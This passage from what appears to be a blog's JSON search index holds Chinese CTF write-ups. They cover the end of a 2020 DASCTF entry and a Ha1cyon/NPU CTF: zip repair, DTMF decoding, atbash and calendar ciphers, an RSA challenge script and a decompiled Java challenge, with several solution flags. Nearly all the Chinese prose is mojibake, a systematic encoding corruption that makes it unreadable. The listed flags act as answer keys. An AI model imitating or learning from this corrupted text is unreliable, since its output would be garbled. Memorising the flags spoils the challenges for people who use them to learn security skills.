·æœå°±æ‰¾åˆ°äº†ã€‚ PIN å°±æ˜¯ 141854ã€‚ ç”¨æ¥è§£å‹å°±å¯ä»¥å¾—åˆ° flagã€‚ flag{6da01c0a419b0b56ca8307fc9ab623eb} å¯¼å‡ºè¿™ä¸ªå‹ç¼©åŒ…å¯ä»¥å…ˆé€‰ä¸­ï¼Œå† Ctrl + Shift + Xå¯¼å‡ºåˆ†ç»„å­—èŠ‚æµã€‚è€Œåä¿å­˜åˆ°æ–‡ä»¶æ‰“å¼€å°±è¡Œã€‚ åé¢æœ‰ç©ºå†äº†è§£ä¸€ä¸‹å†…å­˜å–è¯ä»€ä¹ˆçš„ï¼ˆè¿™æ¬¡å¥½åƒæœ‰ä¸€é¢˜ é¢˜ç›®ç‰ˆæƒå½’å®˜æ–¹æ‰€æœ‰ã€‚ ä»¥ä¸Šå†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ å¥½åƒè¿™ç¯‡æœ‰ç‚¹æ°´å”‰ï¼ˆå…ˆä¸ç®¡äº† å‘¨æ—¥è¿˜è¦è¡¥å‘¨ä¸€çš„è¯¾å‘¢ï¼ˆ ï¼ˆæºœäº†æºœäº†","path":"2020/04/25/CTF_2020DASCTF_April/"},{"title":"CTF | 2020 Ha1cyon_CTFå…¬å¼€èµ› WriteUp","text":"å‰è¨€çœ‹ CTF ç¾¤é‡Œæœ‰å¤§ä½¬å¼•æµï¼Œè¯´å‘¨æœ«è¥¿åŒ—ç“œå¤§ï¼ˆNPUï¼‰æœ‰ä¸ª CTF æ¯”èµ›ï¼Œæ®è¯´å¯¹èŒæ–°æ¯”è¾ƒå‹å¥½ï¼Œäºæ˜¯å°±æ¥çœ‹äº†çœ‹ã€‚ å®˜æ–¹å¹³å°åœ°å€ï¼šhttp://ha1cyon-ctf.fun:666/ å‘¨å…­æ¯”èµ›åˆšå¼€å§‹ï¼Œå¹³å°å°±è¢« DDoS äº†ï¼Œäºæ˜¯é‚£æ—¶åªä¸‹è½½äº†ä¸€é“é¢˜ç›®çš„é™„ä»¶å°±å•¥ä¹Ÿæ²¡äº†â€¦â€¦æ¯”èµ›è¿‡ç¨‹ä¸­å¹³å°ä¹Ÿå±¡å—æ”»å‡»ï¼Œç«¯å£æ¢äº†å¥½å‡ æ¬¡ï¼Œæ¯”å¦‚ 666-&gt;777-&gt;778-&gt;777-&gt;98xï¼Œå¹³å°ç”¨åŠ¨æ€ç«¯å£è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§å‘¢ 23333ã€‚ ç»“æœæ¯”èµ›æ—¶é—´ä¸€ç›´æ‹–åˆ°äº†å‘¨äºŒæ™šä¸Šï¼Œé¢˜ç›®è¿˜è¶Šæ¥è¶Šå¤šï¼Œå™¢ï¼Œæ˜¯ä¸ä¼šçš„é¢˜ç›®è¶Šæ¥è¶Šå¤šäº†ï¼ éšä¾¿å†™ç‚¹ Writeup å¥½äº†ï¼Œä¸»è¦æ˜¯ä¼šåšçš„éƒ¨åˆ†å§ï¼Œé¡ºä¾¿è®°å½•äº†ä¸€ä¸‹åšé¢˜çš„ä½“ä¼šå•¦ã€‚ ï¼ˆåé¢å†çœ‹å¿ƒæƒ…ä¼šä¸ä¼šæŒ‰ç…§å¤§ä½¬ä»¬çš„ WP å¤ç°ä¸€ä¸‹ MiscHappyCheckInVerificationå‹ç¼©åŒ…ä¸­çš„ endLocator è¢«æ”¹åˆ°æœ€å‰é¢äº†ï¼ŒæŒªå›å»ã€‚ç„¶åæŠŠä¼ªåŠ å¯†å»æ‰ã€‚ä¿®æ”¹å¦‚ä¸‹é¢çº¢è‰²éƒ¨åˆ†æ‰€ç¤ºã€‚ è§£å‹å‡ºæ¥ä¸€ä¸ªæ˜¯é»‘äººæŠ¬æ£ºçš„è§†é¢‘ï¼ˆçœŸçš„æœ‰å•Šã€‚ã€‚ï¼‰ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸€ä¸ªäºŒç»´ç ã€‚ æ‹‰åˆ° PS é‡Œè¡¥ä¸Šä¸‰ä¸ªè§’ï¼Œå¾—åˆ°ä¸‹é¢è¿™å›¾ã€‚ æ‰«ç å¾—åˆ°ï¼š ?flag{this_is_not_flag}ä¸‰æ›³æ‰€è«³é™€æ€¯è€¶å—å¤œç¼½å¾—é†¯æ€¯å‹æ•¸ä¸çŸ¥å–ç›§ç‘Ÿä¾„ç›¡é æ•…éš¸æ€¯è–©ä¸å¨‘ç¾¯æ¶…å†¥ä¼Šç›§è€¶è«³æåº¦å¥¢é“ç›§å†¥ä»¥æœ‹ç½°æ‰€å³æ —è«³è’™é›†çš¤å¤·å¤œé›†è«³åˆ©é¡›å‘å¯«ç„¡æ€¯ä¾å¥¢ç«Ÿ#ï¿¥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435...sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$ ç¬¬ä¸€éƒ¨åˆ† ä¸‰æ›³æ‰€è«³é™€æ€¯è€¶å—å¤œç¼½å¾—é†¯æ€¯å‹æ•¸ä¸çŸ¥å–ç›§ç‘Ÿä¾„ç›¡é æ•…éš¸æ€¯è–©ä¸å¨‘ç¾¯æ¶…å†¥ä¼Šç›§è€¶è«³æåº¦å¥¢é“ç›§å†¥ä»¥æœ‹ç½°æ‰€å³æ —è«³è’™é›†çš¤å¤·å¤œé›†è«³åˆ©é¡›å‘å¯«ç„¡æ€¯ä¾å¥¢ç«Ÿ è¿™ä¸€æ®µæ‰”å»ä½›æ›°ï¼Œå¾—åˆ°ï¼š è¯´äº†è¿™ä¸æ˜¯ä½›æ‹‰æ ¼ï¼Œä½ è¿˜æ¥è½¬ï¼Ÿç»™çˆ·çˆªå·´ ä½›æ‹‰æ ¼ flag å¯è¿˜è¡Œâ€¦çœ‹æ¥ä¸æ˜¯äº†ã€‚ ä¸­é—´ä¸€æ®µ E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333 æ‹¿å» base16 ä¸€ä¸‹å¾—åˆ°ï¼š æ‹¿ä½›æ‹‰æ ¼çš„å§¿åŠ¿åœ¨æœ€å2333 ä¸‹ä¸€éƒ¨åˆ† 254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435 base16 å¾—åˆ°ï¼š %C3%BB%C8%CB%B1%C8%CE%D2%B8%FC%B6%AE%B9%DA%D7%B4%B2%A1%B6%BE%2D%2D%CC%D8%C0%CA%C6%D5 çœ‹ä¸Šå»æ˜¯ urlencodeï¼Œè§£ç å¾—åˆ°ï¼š ï¼ˆè¿™é‡Œæ°”æ­»æˆ‘äº†ï¼Œå±…ç„¶ç”¨çš„ gb2312 ç¼–ç è€Œä¸æ˜¯ UTF-8ï¼Œæˆ‘ä»¥ä¸ºå‡çš„åŠå¤©è§£ä¸å‡ºæ¥ï¼Œè™½ç„¶çš„ç¡®æ²¡å•¥ç”¨â€¦ æ²¡äººæ¯”æˆ‘æ›´æ‡‚å† çŠ¶ç—…æ¯’â€“ç‰¹æœ—æ™® åé¢è¿™éƒ¨åˆ†æ²¡çœ‹æ˜ç™½ï¼Œä½†æ„Ÿè§‰æ˜¯æç¤ºäº† use base64. å¦å¤–ï¼Œå‘ç°é»‘äººæŠ¬æ£ºè§†é¢‘é‡Œåˆå‡ºç°äº†ç†Ÿæ‚‰çš„æ‹¨å·å£°ï¼Œå°±æ˜¯ä¹‹å‰åœ¨XCTFé«˜æ ¡æˆ˜â€œç–«â€é‡Œç¢°åˆ°çš„ DTMF ä¿¡å·ã€‚ äºæ˜¯æŠŠè§†é¢‘å¯¼å‡ºäº†éŸ³é¢‘ï¼Œç„¶åæ‹–åˆ° Audacity é‡Œï¼ŒæŸ¥çœ‹é¢‘è°±å›¾ï¼Œæå–å‡ºå¸¦æœ‰æ‹¨å·å£°çš„ç‰‡æ®µï¼Œå¹¶é™åˆ¶é¢‘ç‡èŒƒå›´ï¼Œå¾—åˆ°ä¸‹é¢çš„å›¾ã€‚ 1209 Hz 1336 Hz 1477 Hz 1633 Hz 697 Hz 1 2 3 A 770 Hz 4 5 6 B 852 Hz 7 8 9 C 941 Hz * 0 # D å¯¹ç…§è¡¨æ ¼å¾—åˆ° 418070885ã€‚ï¼ˆå¯èƒ½æœ‰è¯¯ï¼Œåº”è¯¥æ˜¯ä¸ªæ‰‹æœºå·ç ï¼Œå¯èƒ½æ¼äº†å‡ ä½ ï¼ˆæ˜¯ 13418070885 base64 -&gt; NDE4MDcwODg1 MTM0MTgwNzA4ODU= å¥—ä¸Šflagï¼Œflag{nde4mdcwodg1} å‘ç°ä¸å¯¹ï¼ï¼ï¼ï¼ï¼ ï¼ˆç„¶ååšä¸ä¸‹å»äº†å˜¤å˜¤å˜¤ èµ›åæ‰¾åˆ°äº†ä¸€ä¸ªè½¯ä»¶å¯ä»¥åˆ†æ DTMF ä¿¡å·ï¼Œå°±æ˜¯ **dtmf2num.exe*ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä¸‹è½½ã€‚è¿™é‡Œæ˜¯å®ƒ sourceforge çš„é¡¹ç›®åœ°å€ã€‚ï¼ˆå¥½å¤è€ä¸€ä¸ªè½¯ä»¶äº†* ä¸è¿‡è¿™é¢˜è¦ç”¨è½¯ä»¶çš„è¯éœ€è¦æˆªå–å¯¹åº”çš„ç‰‡æ®µæ‰è¡Œï¼Œæ¯•ç«Ÿ BGM å¤ªæ‚äº†è€Œä¸”é¢‘ç‡ä¿¡å·æ¯”è¾ƒæœ‰è§„å¾‹â€¦â€¦ By the wayï¼ŒæŠ›å¼€é¢˜ç›®æ¥è¯´ï¼Œè¿™ä¸ª BGM å°±å±äºç”µéŸ³å˜›ï¼Œå°±ä¸€å †æœ‰è§„å¾‹çš„é¢‘ç‡ä¿¡å·çš„ç»„åˆå”‰ï¼Œè¿˜å¸¦æœ‰è¿ç»­è°ƒé¢‘ã€‚ã€‚ åé¢çœ‹äº†å¤§ä½¬çš„ WPï¼Œå‘ç°éœ€è¦æŠŠ b64encode åçš„ç»“æœå‘åˆ°è¥¿åŒ—ç“œå¤§ä¿¡å®‰åä¼šçš„å…¬ä¼—å·ï¼ˆNWPUSECï¼‰ï¼ˆå±…ç„¶è¿™æ ·å¼•æµï¼ï¼‰ï¼Œå¾—åˆ°ä¸€ä¸ªéŸ³é¢‘ä¿¡å·ï¼Œæ˜¯æ— çº¿ç”µä¼ è¾“çš„å›¾åƒï¼Œè§£ç å¾—åˆ°çš„å›¾ç‰‡é‡Œå°±æœ‰ flagâ€¦â€¦ ï¼ˆçœŸæƒ³ä¸å‡ºæ¥ï¼Œå•Šæ˜¯æ— çº¿ç”µå¤§ä½¬ï¼Misc çœŸçš„æ‚ã€‚ æŠ½è±¡å¸¦å¸ˆ NPUCTF{æ¬¢è¿æ¥åˆ°è¥¿åŒ—å·¥ä¸šå¤§å­¦CTFæ¯”èµ›ä¸–ç•Œä¸Šæœ€ç®€å•çš„æ¯”èµ›} æ‚¨ä¹Ÿæ˜¯æŠ½è±¡å¸¦å¸ˆï¼Ÿ å†ä¹Ÿä¸ä¿¡ä»€ä¹ˆ Easy/(Real) Ez/Baby/Basic/Not Hard/â€¦ éƒ½æ˜¯å‡çš„å‡çš„ã€‚ partså¥½å‡ ä¸ªpartsï¼Œzde0, zde1, zfr0, â€¦ çœ‹æ–‡ä»¶å¤´æ˜¯ä¸€å †å‹ç¼©åŒ…ï¼Œè§£å‡ºæ¥æœ‰ä¸ª hint Here's the hint: 33 * 33 = 1089 And everything is inside the image è¿˜æœ‰ä¸€å¼ å›¾ï¼ŒBV1kx411F7Fn.png çœ‹æ¥ flag åœ¨å›¾ç‰‡é‡Œï¼Œä¸è¿‡ 33*33 æ²¡çœ‹æ˜ç™½ã€‚ foremost æå–ä¸å‡ºæ¥ï¼Œçœ‹ Hex æ–‡ä»¶æ˜¯æœ‰ç‚¹é—®é¢˜ã€‚ å›¾ç‰‡æ–‡ä»¶åçœ‹ä¸Šå»åƒæ˜¯ Bç«™çš„ BV å·ï¼Œä¸Šå»çœ‹äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ä»€ä¹ˆçº¿ç´¢â€¦â€¦ åƒäº†å®ƒmay be hint.txtæç¤º emmmmm... something important was hidden in secret, but I can't find it! lookatme.txt ä¸‹é¢æœ‰ä¸€æ®µè«åå¥‡å¦™çš„ç©ºç™½å­—ç¬¦ã€‚ä¸æ¸…æ¥šå•¥ç©æ„äº†ã€‚ secretæ–‡ä»¶å¤´æ˜¯ MPE1ï¼ˆ4D 50 45 31ï¼‰ï¼Œæœäº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡ä»¶æ ¼å¼å‘¢ã€‚ è¹² WPã€‚ WebæŸ¥æºç ç»ˆäºçœ‹åˆ°æœ‰é€åˆ†é¢˜äº†ï¼ å°±æ˜¯æŸ¥æºç å®Œäº‹ã€‚ F12 ç¦æ‰äº†ï¼Œç”¨ Ctrl + Shift + C æˆ–è€…ç‚¹æµè§ˆå™¨çš„ Web å¼€å‘è€… ä¹‹ç±»çš„å°±è¡Œã€‚ CryptoClassical_Cipherkey.txt ä¸­æç¤ºï¼š è§£å¯†åçš„flagè¯·ç”¨flag{}åŒ…è£¹ å‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhs å¯¹åº”æ˜æ–‡ï¼š ***_key_**_****** çœ‹äº†ä¸€ä¸‹ï¼Œä¸æ˜¯å‡¯æ’’ã€‚äºæ˜¯ä¸¢åˆ° quipqiup å»è§£å¯†ï¼Œå·²çŸ¥ pvb=keyã€‚ æ ¹æ®å¾—åˆ°çš„ç­”æ¡ˆï¼Œå¤§æ¦‚å½¢å¼æ˜¯ the_key_is_??????ï¼Œåé¢è¿™ä¸ªä¸å¤§å¯¹ï¼Œäºæ˜¯æ”¹å˜ clues ä¸º pvb=key rh=is gs=thï¼Œå¾—åˆ°åˆç†çš„è§£ä¸º the_key_is_atbashã€‚ å™¢ï¼Œèµ›åå‘ç°è¿™æ˜¯ atbash ç¼–ç ï¼ˆåŸƒç‰¹å·´ä»€ç ï¼‰ï¼Œä¸€ç§å¤å…¸çš„å¯†ç ã€‚ å¯†æ–‡å°±æ˜¯å­—æ¯è¡¨åè¿‡æ¥å¯¹åº”ä½ç½®çš„å­—æ¯ï¼Œå³å¯†æ–‡å’Œæ˜æ–‡å­—æ¯çš„å¯¹åº”ä½ç½®ä¹‹å’Œä¸º27. å¸¸æ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z å¯†æ–‡ï¼šZ Y X W V U T S R Q P O N M L K J I H G F E D C B A æ‹¿è¿™ä¸ªå¯†ç å»è§£å‹ flag.zipï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚ åˆæ˜¯æŠ½è±¡å¸¦å¸ˆã€‚æœ‰ä¸€éƒ¨åˆ†æ˜¯çŒªåœˆå¯†ç çš„å˜ç§ï¼Œè§ä¸‹å›¾ã€‚ C??SSIC??C??E å‰©ä¸‹çš„çªç„¶æƒ³åˆ°æ˜¯å­—ç¬¦å½¢çŠ¶çš„å­—ä½“äº†ï¼Œè”æƒ³é¢˜ç›® Classical Cipherï¼Œåº”è¯¥æ˜¯ classicalã€‚ æ‰¾äº†ä¸ªè¯†åˆ«å­—ä½“çš„ç½‘ç«™ï¼Œæ¯”å¦‚è¿™ä¸ªï¼Œç„¶åå¯¹åº”ä¸€æ³¢å‘ç°çœŸçš„æœ‰ï¼ åœ¨ Egypt0 Regular é‡Œæ²¡æ‰¾åˆ°ï¼Œå€’æ˜¯åœ¨ ROSETTA STONE Regular é‡Œæ‰¾åˆ°äº†ã€‚ äºæ˜¯å°±æ˜¯ CLASSICALCODEï¼ˆå…¶å®å¯¹åº”ä¸ŠDå°±çŒœåˆ°æ˜¯codeäº†ï¼‰ã€‚flag{CLASSICALCODE}äº¤ä¸Šå»å‘ç°ä¸å¯¹ï¼Œè¦æ¢æˆå°å†™ã€‚ flag{classicalcode} åŸæ¥è¿™æ˜¯å¤åŸƒåŠè±¡å½¢æ–‡å­—â€¦ æ›´å¤šå¯†ç å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼šhttp://www.tuicool.com/articles/2E3INnm è¿™æ˜¯ä»€ä¹ˆè§…ğŸ 2020å¹´4æœˆ F1 W1 S22 S21 T12 S11 W1 S13 æ˜¯æ—¥å†å¯†ç å”‰ï¼ï¼ˆçœŸä¼šç©å‘¢ 3 1 12 5 14 4 1 18 l=[3,1,12,5,14,4,1,18] s='' for i in l: s+=chr(ord('A')+i-1) print(s) å¾—åˆ° CALENDAR flag{calendar} æ—¥å†å¯†ç åŸåˆ™ï¼š ï¼ˆ1ï¼‰1â€”26ä»£è¡¨aâ€”z26ä¸ªè‹±æ–‡å­—æ¯ï¼›ï¼ˆ2ï¼‰M,T1,W,T2,F,S1,S2åˆ†åˆ«ä»£è¡¨å‘¨ä¸€åˆ°å‘¨æ—¥ä¸ƒå¤©ï¼ˆè‹±æ–‡é¦–å­—æ¯ä»£æ›¿ï¼Œ1ï¼Œ2ä¸ºäº†æœ‰åˆ«ï¼Œä¹Ÿäººä¸ºå¢åŠ å¯†åº¦ï¼‰ï¼›ï¼ˆ3ï¼‰å¯†é’¥å³å¯†ç è¡¨ ä»¥2007å¹´11æœˆä»½çš„æ—¥å†ä¸ºå¯†ç è¡¨ï¼Œæˆ‘ä»¬æ¥åŠ å¯†è¿™ä¸ªå•è¯ï¼šdictionaryç¬¬ä¸€æ­¥ï¼Œç”¨æ•°å­—ä»£æ›¿æ˜æ–‡ä¸­çš„å­—æ¯ï¼Œå³D I C T I O N A R Y; 4 9 3 20 9 15 14 1 18 25ç¬¬äºŒæ­¥ï¼Œå†™å¯†æ–‡ã€‚æ–¹æ³•ï¼šä¾‹å¦‚å•è¯é¦–å­—æ¯Dç”¨4ä»£æ›¿ï¼Œåˆ™åœ¨æ—¥å†ä¸­æ‰¾åˆ°4å·ï¼Œå‘ç°æ˜¯æœ¬æœˆç¬¬ä¸€ä¸ªæ˜ŸæœŸæ—¥ï¼Œæ‰€ä»¥ç”¨S21è¡¨ç¤ºï¼›åˆå¦‚ç¬¬ä¸ƒä¸ªå­—æ¯Nç”¨æ•°å­—14ä»£è¡¨ï¼Œæ‰¾åˆ°14å·ï¼Œå‘ç°æ˜¯æœ¬æœˆç¬¬äºŒä¸ªæ˜ŸæœŸä¸‰ï¼Œç”¨W2ä»£è¡¨ã€‚å¦‚æ­¤ç±»æ¨ï¼Œå¾—åˆ°å¯†æ–‡å¦‚ä¸‹ï¼šS21 F2 S11 T13 F2 T23 W2 T21 S23 S24 æ­¤ç±»å¯†ç çš„è§£æ³•å¦‚ä¸‹ï¼šï¼ˆ1ï¼‰é¦–å…ˆè¦çŸ¥é“å¯†é’¥ï¼Œå³å¯†ç è¡¨ï¼›ï¼ˆ2ï¼‰å…¶æ¬¡åˆ†è§£å¯†ç ä¸­çš„æ˜ŸæœŸ iï¼Œå³å˜æˆæ˜ŸæœŸ+æ•°å­—çš„å½¢å¼ï¼›ï¼ˆ3ï¼‰å»å¯»æ‰¾å¯¹åº”çš„æ˜¯ç¬¬å‡ ä¸ªå‡ºç°çš„æ˜ŸæœŸ iï¼Œå¯¹åº”æ—¥æœŸï¼›ï¼ˆ4ï¼‰å¯¹åº”å­—æ¯ï¼Œç»ƒæˆå•è¯ï¼ŒçŸ­è¯­æˆ–å¥å­ã€‚ è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒé¢˜ç›®å¦‚ä¸‹ï¼Œçœ‹ä¸Šå»å°±æ˜¯ RSA ä¹‹ç±»çš„å§ã€‚ from Crypto.Util.number import * from gmpy2 import * from secret import flag p = getPrime(25) e = # Hidden q = getPrime(25) n = p * q m = bytes_to_long(flag.strip(b\"npuctf{\").strip(b\"}\")) c = pow(m, e, n) print(c) print(pow(2, e, n)) print(pow(4, e, n)) print(pow(8, e, n)) ''' 169169912654178 128509160179202 518818742414340 358553002064450 ''' è¿™æ¬¡å»çœ‹äº†ä¸€äº› RSA çš„çŸ¥è¯†ï¼Œç„¶è€Œä¸å¤§æ˜ç™½è¿™äº›åŠ å¯†ç®—æ³•ï¼Œæ›´ä¸äº†è§£ç›¸å…³çš„è§£å¯†ç®—æ³•ï¼Œè¿˜æ²¡æœ‰ OI åŸºç¡€ï¼Œäºæ˜¯é¢˜ç›®çœ‹èµ·æ¥æŒºç®€å•çš„ç„¶è€Œè¿˜æ˜¯ä¸å¤§ä¼šè§£ emmmï¼ˆï¼ˆ ï¼ˆCryptoæ¨¡å—éƒ½ä¸å¤§ç†Ÿæœ‰å“ªäº›ç°æˆæ–¹æ³•ï¼Œgmpy2 æ¨¡å—è£…äº†åŠå¤©è¿˜æ²¡è£…å¥½ã€‚ã€‚ é¢˜ç›®åº”è¯¥å« è®¤æ¸…å½¢åŠ¿ï¼Œæ”¾å¼ƒå¹»æƒ³ æ‰å¯¹å§ã€‚ Reversemachineï¼ˆä¸è®°å¾—é¢˜ç›®äº† è¿™é¢˜æ˜¯ä¸ª Java å†™çš„åº”ç”¨ï¼Œæ‹¿å» Java Decompiler åç¼–è¯‘äº†ä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š è™½ç„¶ä¹Ÿæ²¡å­¦è¿‡ Javaï¼Œä½†å¤§æ¦‚æ„æ€è¿˜æ˜¯èƒ½çœ‹ä¸ªå¤§æ¦‚çš„ã€‚ public class Gui extends Frame { public void c() { JFrame f = new JFrame(\"gkd\"); f.setBounds(400, 250, 600, 450); f.setLayout(null); final Container j = f.getContentPane(); JButton c = new JButton(\"å¥¥é‡Œç»™\"); final JTextField b = new JTextField(20); final JLabel l = new JLabel(\"\"); JLabel saying = new JLabel(\"å›¢é•¿è¯´:180298505946947064650759\"); b.addKeyListener(new KeyListener() { public void keyTyped(KeyEvent e) { int c = e.getKeyChar(); if ((c &lt; 48) || (c &gt; 57)) { e.consume(); } } public void keyReleased(KeyEvent e) {} public void keyPressed(KeyEvent e) {} }); c.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { String s = b.getText(); boolean u = true; for (int i = 0; i &lt; s.length(); i++) { if ((s.charAt(i) &lt; '0') || (s.charAt(i) &gt; '9')) { u = false; } } if ((u) &amp;&amp; (new BigInteger(\"100\").compareTo(new BigInteger(s)) == 1)) { u = false; } if (!u) { l.setText(\"é€—çˆ·ç©å‘¢,ç»™çˆ·çˆªå·´,å†ç©ä¸‹å»å›¢é•¿å°±è¦å”±å¸Œæœ›ä¹‹èŠ±äº†\");return; } Lib f = new Lib(s); BigInteger b = f.e(); l.setText(\"n=\" + b.toString() + \",e=65537\"); j.validate(); } }); b.setBounds(200, 120, 200, 50); c.setBounds(250, 200, 100, 30); l.setBounds(150, 260, 300, 50); saying.setBounds(190, 60, 220, 30); j.add(b); j.add(c); j.add(l); j.add(saying); f.setDefaultCloseOperation(3); f.setVisible(true); } è¿™ä¸Šé¢çš„ä»£ç éƒ½æ˜¯æ§åˆ¶ GUI çš„ï¼Œç»™è¾“å…¥æ¡†ç»‘å®šäº†å‡½æ•°ï¼Œå¦‚æœä¸æ˜¯æ•°å­—ï¼ˆâ€™0â€™-â€˜9â€™ï¼‰çš„è¯å°±é”€æ¯ï¼ˆè¾“å…¥ä¸æ˜¾ç¤ºåœ¨æ¡†é‡Œï¼‰ã€‚ ç»™ button ç»‘å®šäº†æ‰§è¡Œå‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­è¾“å…¥å­—ç¬¦æ˜¯ä¸æ˜¯æ•°å­—ï¼Œå†æ¯”è¾ƒè¾“å…¥çš„æ•°å­—æ˜¯å¦ &gt;100ï¼Œå¦‚æœéƒ½ä¸æˆç«‹å°±è¾“å‡º é€—çˆ·ç©å‘¢,ç»™çˆ·çˆªå·´,å†ç©ä¸‹å»å›¢é•¿å°±è¦å”±å¸Œæœ›ä¹‹èŠ±äº†ã€‚ Lib f = new Lib(s); BigInteger b = f.e(); l.setText(\"n=\" + b.toString() + \",e=65537\"); éƒ½æˆç«‹çš„è¯å†ç”¨è¾“å…¥çš„æ•°å­—å»å®ä¾‹åŒ– LIbï¼Œçœ‹ä¸Šé¢è¿™å‡ è¡Œæ„Ÿè§‰å°±æ˜¯ç®—å¤§æ•´æ•°näº†ï¼Œåˆæ˜¯ RSAï¼Ÿ æŒ‰ç…§ä¸Šé¢çš„è§„åˆ™è¾“å…¥å‡ ä¸ªæ•°å­—è¯•äº†è¯•ï¼Œå‘ç°ç¨‹åºå¡æ­»ï¼Œç–¯ç‹‚å ç”¨ CPU çš„ä¸€ä¸ªæ ¸å¿ƒï¼ˆå•çº¿ç¨‹å‘¢ï¼‰è¿›è¡Œè¿ç®—ã€‚ æ˜¯åœ¨å¹²å˜›å™¢ï¼Œä¸‹é¢çœ‹çœ‹ Lib ç±»å§ã€‚ package machine; import java.math.BigInteger; import java.util.HashMap; import java.util.Map; import java.util.Random; import java.util.Set; import java.util.Stack; public class Lib { private BigInteger b; private Map&lt;BigInteger, Integer&gt; m; private static final int B = 150; private void f() { BigInteger T = new BigInteger(\"3\"); BigInteger t = new BigInteger(\"2\"); BigInteger t1 = new BigInteger(\"0\"); for (int i = 0; this.b.mod(t).equals(t1); i++) { this.b = this.b.divide(t); } this.m.put(t, Integer.valueOf(i)); for (i = 0; this.b.mod(T).equals(t1); i++) { this.b = this.b.divide(T); } this.m.put(T, Integer.valueOf(i)); } private void s() { while (!this.b.equals(BigInteger.ONE)) { BigInteger d = new BigInteger(150, new Random()); for (int i = 0; i &lt; 3; i++) { d = d.add(BigInteger.ONE); } if (this.b.mod(d).equals(BigInteger.ZERO)) { this.b = this.b.divide(d); for (BigInteger j = new BigInteger(\"5\"); d.compareTo(j) == 1; j.add(BigInteger.ONE)) { if (d.mod(j).equals(BigInteger.ZERO)) { this.m.replace(j, Integer.valueOf(((Integer)this.m.get(j)).intValue() + 1)); j = j.subtract(BigInteger.ONE); d = d.divide(j); } } this.m.replace(d, Integer.valueOf(((Integer)this.m.get(d)).intValue() + 1)); } } } public BigInteger e() { Set&lt;BigInteger&gt; p = this.m.keySet(); Stack&lt;BigInteger&gt; o = new Stack(); BigInteger d = BigInteger.ONE; for (BigInteger q : p) { o.push(q); } d = d.multiply((BigInteger)o.elementAt(o.size() - 1)); d = d.multiply((BigInteger)o.elementAt(o.size() - 2)); return d; } Lib(String num) { this.b = new BigInteger(num); this.m = new HashMap(); f(); s(); } } çœ‹æœ€ä¸‹é¢çš„å‡½æ•°ï¼Œé¦–å…ˆ b ä¸ºè¾“å…¥çš„æ•°å­—ï¼Œmä¸ºä¸€ä¸ª HashMapï¼ˆä¸æ˜¯å¾ˆæ‡‚ï¼Ÿ f()å‡½æ•°å…ˆæ˜¯ä¸æ–­è®© b/2 ç›´åˆ° b mod 2 == 0ï¼Œç„¶åæŠŠè¿™æ—¶çš„ 2 å’Œç´¢å¼• i æ”¾å…¥ mï¼›ä¹‹ååŒç†è®© b/3ï¼ŒæŠŠ 3 å’Œç´¢å¼• i æ”¾å…¥ mã€‚ s()å‡½æ•°â€¦â€¦ ï¼ˆåšåˆ°è¿™é‡Œåé¢æœ‰äº‹å°±æ²¡çœ‹ä¸‹å»äº† è¹²ä¸ªå¤§ä½¬çš„ WP çœ‹çœ‹ã€‚ å…¶ä»–é¢˜è¿™æ¬¡è¿˜æœ‰æŒºå¤šæœ‰æ„æ€çš„é¢˜ç›®å§ã€‚ æ¯”å¦‚ Misc æœ‰é“ Minecraft çš„é¢˜ç›®ï¼Œçœ‹æˆªå›¾è¿˜æœ‰çº¢çŸ³ç”µè·¯çš„ï¼Œä¸è¿‡å€’æ˜¯æ²¡äººåšå‡ºæ¥ç½¢äº†ã€‚ Reverse é‡Œæœ‰ä¸ª R_E_5_E_T.exe æ˜¯ç”¨ VB å†™çš„ï¼Œç¥å™¨ IDA å°±ç›´æ¥ç”¨ä¸äº†äº†ï¼Œè²Œä¼¼è¿˜åŠ äº†å£³ï¼Œç»™äº†ä¸€å † hint ç„¶è€Œå¹¶ä¸ä¼šåšã€‚ æœ‰é“é¢˜ are-you-a-fan ç”¨äº†ä¸€å †ä½è¿ç®—ï¼Œhint æ˜¯ NANDï¼ˆæ•°ç”µé‡Œçš„ï¼Ÿï¼‰ï¼Œå“‡å‘œéš¾é¡¶ã€‚ Crypto é‡Œæœ‰ä¸ª EzRSAï¼Œæ–‡ä»¶åæ˜¯ difficultrsa.pyï¼Œå™¢æš´éœ²çœŸç›¸äº†2333ã€‚ åˆ°æœ€åè¿˜å‡ºäº† OI çš„é¢˜ï¼ˆæ²¡ç©è¿‡ï¼Œå†è§ï¼‰â€¦â€¦ç›®ç¹äº†é—®å·ï¼Ÿå¤§ä½¬ç–¯ç‹‚ç§’é¢˜ï¼Œï¼Ÿï¼Ÿï¼Ÿ å°ç»“è¿™æ¬¡æ¯”èµ›å¹³å°æ˜¯ç”¨ docker éƒ¨ç½²çš„ CTFdï¼Œä¸Šäº†åŠ¨æ€ flag å’Œç‹¬ç«‹ç¯å¢ƒï¼Œä»è¿™ä¸ªè§’åº¦è€Œè¨€åšé¢˜æ„Ÿå—æŒºå¥½çš„ã€‚åªæ˜¯ç‹¬ç«‹ç¯å¢ƒç›´æ¥ç»‘å®šåˆ°äº†åŒä¸€ä¸ªåŸŸå ha1cyon-ctf.fun 